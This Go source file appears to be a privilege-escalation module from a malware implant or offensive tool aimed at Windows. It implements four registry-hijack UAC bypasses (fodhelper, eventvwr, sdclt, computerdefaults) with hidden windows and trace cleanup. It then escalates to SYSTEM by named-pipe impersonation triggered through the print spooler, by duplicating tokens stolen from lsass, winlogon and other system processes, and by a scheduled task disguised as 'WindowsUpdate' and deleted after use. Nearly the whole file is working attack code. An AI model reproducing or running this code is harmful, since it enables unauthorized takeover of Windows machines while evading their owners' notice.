package handlers

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	TokenElevationType     = 18
	TokenElevationTypeFull = 2
)

var (
	kernel32         = windows.NewLazySystemDLL("kernel32.dll")
	advapi32         = windows.NewLazySystemDLL("advapi32.dll")
	winspool         = windows.NewLazySystemDLL("winspool.drv")
	procGetTickCount = kernel32.NewProc("GetTickCount")
	procClosePrinter = winspool.NewProc("ClosePrinter")
	procAddPrinterW  = winspool.NewProc("AddPrinterW")
	procOpenPrinterW = winspool.NewProc("OpenPrinterW")
)

type PrivilegeManager struct {
	debugPrivilegeEnabled bool
}

type PRINTER_INFO_2 struct {
	pServerName         *uint16
	pPrinterName        *uint16
	pShareName          *uint16
	pPortName           *uint16
	pDriverName         *uint16
	pComment            *uint16
	pLocation           *uint16
	pDevMode            uintptr
	pSepFile            *uint16
	pPrintProcessor     *uint16
	pDatatype           *uint16
	pParameters         *uint16
	pSecurityDescriptor uintptr
	Attributes          uint32
	Priority            uint32
	DefaultPriority     uint32
	StartTime           uint32
	UntilTime           uint32
	Status              uint32
	cJobs               uint32
	AveragePPM          uint32
}

func NewPrivilegeManager() *PrivilegeManager {
	return &PrivilegeManager{
		debugPrivilegeEnabled: false,
	}
}

func (pm *PrivilegeManager) IsAdmin() bool {
	var isAdmin bool

	file, err := os.OpenFile(`\\.\PHYSICALDRIVE0`, os.O_RDONLY, 0)
	if err == nil {
		file.Close()
		isAdmin = true
	}

	if !isAdmin {
		var token windows.Token
		if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
			defer token.Close()

			var elevationType uint32
			var returnedLen uint32

			if err := windows.GetTokenInformation(
				token,
				TokenElevationType,
				(*byte)(unsafe.Pointer(&elevationType)),
				uint32(unsafe.Sizeof(elevationType)),
				&returnedLen,
			); err == nil {
				isAdmin = elevationType == TokenElevationTypeFull
			}
		}
	}

	return isAdmin
}

func (pm *PrivilegeManager) BypassUAC() bool {
	if pm.IsAdmin() {
		return true
	}

	methods := []struct {
		name   string
		method func() bool
	}{
		{"fodhelper", pm.fodhelperBypass},
		{"eventvwr", pm.eventvwrBypass},
		{"sdclt", pm.sdcltBypass},
		{"computerdefaults", pm.computerDefaultsBypass},
	}

	for _, m := range methods {
		if m.method() {
			for i := 0; i < 10; i++ {
				time.Sleep(1 * time.Second)
				if pm.IsAdmin() {
					return true
				}
			}
		}
		time.Sleep(2 * time.Second)
	}

	return false
}

func (pm *PrivilegeManager) ElevateToSystem() bool {
	if !pm.IsAdmin() {
		return false
	}

	methods := []struct {
		name   string
		method func() bool
	}{
		{"named_pipe_impersonation", pm.namedPipeImpersonation},
		{"token_duplication", pm.tokenDuplicationAttack},
		{"scheduled_task", pm.scheduleTaskAttack},
	}

	for _, m := range methods {
		if m.method() {
			return true
		}
		time.Sleep(2 * time.Second)
	}

	return false
}

func (pm *PrivilegeManager) genericBypass(regPath, binary string) bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	key, _, err := registry.CreateKey(registry.CURRENT_USER, regPath, registry.ALL_ACCESS)
	if err != nil {
		return false
	}
	defer key.Close()

	if err := key.SetStringValue("", exePath); err != nil {
		return false
	}

	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		return false
	}

	cmd := exec.Command(binary)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}

	if err := cmd.Start(); err != nil {
		pm.cleanupRegistry(regPath)
		return false
	}

	go func() {
		time.Sleep(15 * time.Second)
		pm.cleanupRegistry(regPath)
	}()

	return true
}

func (pm *PrivilegeManager) fodhelperBypass() bool {
	return pm.genericBypass(
		`Software\Classes\ms-settings\shell\open\command`,
		"fodhelper.exe",
	)
}

func (pm *PrivilegeManager) eventvwrBypass() bool {
	return pm.genericBypass(
		`Software\Classes\mscfile\shell\open\command`,
		"eventvwr.exe",
	)
}

func (pm *PrivilegeManager) sdcltBypass() bool {
	return pm.genericBypass(
		`Software\Classes\Folder\shell\open\command`,
		"sdclt.exe",
	)
}

func (pm *PrivilegeManager) computerDefaultsBypass() bool {
	return pm.genericBypass(
		`Software\Classes\ms-settings\shell\open\command`,
		"computerdefaults.exe",
	)
}

func (pm *PrivilegeManager) cleanupRegistry(path string) {
	parts := strings.Split(path, "\\")

	for i := len(parts); i > 3; i-- {
		subPath := strings.Join(parts[:i], "\\")
		if err := registry.DeleteKey(registry.CURRENT_USER, subPath); err != nil {
			continue
		}
	}
}

func (pm *PrivilegeManager) namedPipeImpersonation() bool {
	if !pm.enableDebugPrivilege() {
		return false
	}

	pipeName := `\\.\pipe\` + pm.randomString(12)
	hPipe, err := pm.createNamedPipe(pipeName)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(hPipe)

	go pm.triggerSystemConnection(pipeName)

	var overlapped windows.Overlapped
	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(event)
	overlapped.HEvent = event

	err = windows.ConnectNamedPipe(hPipe, &overlapped)
	if err != nil && err != windows.ERROR_IO_PENDING && err != windows.ERROR_PIPE_CONNECTED {
		return false
	}

	if err == windows.ERROR_IO_PENDING {
		result, err := windows.WaitForSingleObject(event, 10000)
		if err != nil || result != windows.WAIT_OBJECT_0 {
			return false
		}
	}

	if err := pm.impersonateNamedPipeClient(hPipe); err != nil {
		return false
	}
	defer windows.RevertToSelf()

	var threadToken windows.Token
	if err := windows.OpenThreadToken(
		windows.CurrentThread(),
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_ASSIGN_PRIMARY,
		false,
		&threadToken,
	); err != nil {
		return false
	}
	defer threadToken.Close()

	var dupToken windows.Token
	if err := windows.DuplicateTokenEx(
		threadToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupToken,
	); err != nil {
		return false
	}
	defer dupToken.Close()

	return pm.createSystemProcess(dupToken)
}

func (pm *PrivilegeManager) tokenDuplicationAttack() bool {
	if !pm.enableDebugPrivilege() {
		return false
	}

	targets := []string{
		"winlogon.exe",
		"lsass.exe",
		"services.exe",
		"csrss.exe",
		"wininit.exe",
	}

	for _, proc := range targets {
		if token, err := pm.getProcessToken(proc); err == nil {
			defer token.Close()

			if pm.createSystemProcess(token) {
				return true
			}
		}
	}
	return false
}

func (pm *PrivilegeManager) scheduleTaskAttack() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	taskName := "WindowsUpdate" + pm.randomString(8)

	cmd := fmt.Sprintf(
		`schtasks /create /tn "%s" /tr "%s" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f`,
		taskName, exePath,
	)

	createCmd := exec.Command("cmd", "/C", cmd)
	createCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := createCmd.Run(); err != nil {
		return false
	}

	runCmd := exec.Command("schtasks", "/run", "/tn", taskName)
	runCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := runCmd.Run(); err != nil {
		exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run()
		return false
	}

	go func() {
		time.Sleep(30 * time.Second)
		cleanupCmd := exec.Command("schtasks", "/delete", "/tn", taskName, "/f")
		cleanupCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cleanupCmd.Run()
	}()

	return true
}

func (pm *PrivilegeManager) enableDebugPrivilege() bool {
	if pm.debugPrivilegeEnabled {
		return true
	}

	var token windows.Token
	if err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&token,
	); err != nil {
		return false
	}
	defer token.Close()

	var luid windows.LUID
	privName, _ := windows.UTF16FromString("SeDebugPrivilege")
	if err := windows.LookupPrivilegeValue(nil, &privName[0], &luid); err != nil {
		return false
	}

	privs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	if err := windows.AdjustTokenPrivileges(token, false, &privs, 0, nil, nil); err != nil {
		return false
	}

	if windows.GetLastError() == windows.ERROR_NOT_ALL_ASSIGNED {
		return false
	}

	pm.debugPrivilegeEnabled = true
	return true
}

func (pm *PrivilegeManager) getProcessToken(processName string) (windows.Token, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return 0, err
	}

	for {
		name := windows.UTF16ToString(procEntry.ExeFile[:])
		if strings.EqualFold(name, processName) {
			procHandle, err := windows.OpenProcess(
				windows.PROCESS_QUERY_INFORMATION,
				false,
				procEntry.ProcessID,
			)
			if err != nil {
				goto next
			}
			defer windows.CloseHandle(procHandle)

			var token windows.Token
			if err := windows.OpenProcessToken(
				procHandle,
				windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_ASSIGN_PRIMARY,
				&token,
			); err == nil {
				return token, nil
			}
		}

	next:
		if err := windows.Process32Next(snapshot, &procEntry); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found or access denied", processName)
}

func (pm *PrivilegeManager) createNamedPipe(pipeName string) (windows.Handle, error) {
	return windows.CreateNamedPipe(
		windows.StringToUTF16Ptr(pipeName),
		windows.PIPE_ACCESS_DUPLEX|windows.FILE_FLAG_OVERLAPPED,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1,
		1024,
		1024,
		0,
		nil,
	)
}

func (pm *PrivilegeManager) triggerSystemConnection(pipeName string) {
	time.Sleep(1 * time.Second) 

	shortName := strings.TrimPrefix(pipeName, `\\.\pipe\`)

	methods := []func(string) bool{
		pm.triggerViaSpooler,
		pm.triggerViaRPC,
		pm.triggerViaService,
	}

	for _, method := range methods {
		if method(shortName) {
			return
		}
		time.Sleep(1 * time.Second)
	}
}

func (pm *PrivilegeManager) triggerViaSpooler(pipeName string) bool {
	printerName := fmt.Sprintf("\\\\localhost\\pipe\\%s", pipeName)
	printerNamePtr, _ := windows.UTF16PtrFromString(printerName)

	var hPrinter windows.Handle
	ret, _, _ := procOpenPrinterW.Call(
		uintptr(unsafe.Pointer(printerNamePtr)),
		uintptr(unsafe.Pointer(&hPrinter)),
		0,
	)

	if ret != 0 && hPrinter != 0 {
		procClosePrinter.Call(uintptr(hPrinter))
		return true
	}
	return false
}

func (pm *PrivilegeManager) triggerViaRPC(pipeName string) bool {
	cmd := exec.Command("sc", "query", "type=", "service")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run() == nil
}

func (pm *PrivilegeManager) triggerViaService(pipeName string) bool {
	cmd := exec.Command("net", "use", fmt.Sprintf("\\\\localhost\\pipe\\%s", pipeName))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run() == nil
}

func (pm *PrivilegeManager) impersonateNamedPipeClient(hPipe windows.Handle) error {
	ret, _, err := procImpersonateNamedPipeClient.Call(uintptr(hPipe))
	if ret == 0 {
		return err
	}
	return nil
}

var procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")

func (pm *PrivilegeManager) createSystemProcess(token windows.Token) bool {
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop = windows.StringToUTF16Ptr("winsta0\\default")

	cmdLine, _ := windows.UTF16PtrFromString("cmd.exe /c whoami > C:\\system_verification.txt")

	err := windows.CreateProcessAsUser(
		token,
		nil,
		cmdLine,
		nil,
		nil,
		false,
		windows.CREATE_NEW_CONSOLE,
		nil,
		nil,
		&si,
		&pi,
	)

	if err != nil {
		return false
	}

	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

	return true
}

func (pm *PrivilegeManager) randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)

	if _, err := rand.Read(b); err != nil {
		tickCount, _, _ := procGetTickCount.Call()
		for i := range b {
			b[i] = charset[(tickCount+uintptr(i))%uintptr(len(charset))]
		}
	} else {
		for i, v := range b {
			b[i] = charset[v%byte(len(charset))]
		}
	}

	return string(b)
}
